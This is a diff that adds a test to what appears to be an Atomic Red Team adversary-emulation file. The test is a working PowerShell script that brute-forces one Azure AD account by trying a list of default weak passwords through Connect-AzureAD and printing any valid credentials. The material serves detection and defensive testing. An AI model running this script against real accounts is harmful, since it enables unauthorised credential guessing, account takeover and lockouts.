@@ -81,3 +81,47 @@ atomic_tests:
         }
       }
       Write-Host "End of bruteforce"
+- name: Brute Force Credentials of single Azure AD user
+  auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69
+  description: |
+    Attempt to brute force Azure AD user via AzureAD powershell module.
+  supported_platforms:
+  - windows
+  input_arguments:
+    username:
+      description: Account to bruteforce
+      type: String
+      default: bruce.wayne@contoso.com
+    passwords:
+      description: List of passwords we will attempt to brute force with
+      type: String
+      default: Password1`n1q2w3e4r`nPassword!
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AzureAD module must be installed.
+    prereq_command: |
+      if (Get-Module AzureAD) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Install-Module -Name AzureAD -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Import-Module -Name AzureAD
+
+      $passwords = "#{passwords}".split("{`n}")
+      foreach($password in $passwords) {
+        $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+        try {
+          Write-Host " [-] Attempting ${password} on account #{username}."
+          Connect-AzureAD -Credential $Credential 2>&1> $null
+          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+          Write-Host " [!] #{username}:${password} are valid credentials!`r`n"
+          break
+        } catch {
+          Write-Host " [-] #{username}:${password} invalid credentials.`r`n"
+        }
+      }
+      Write-Host "End of bruteforce"
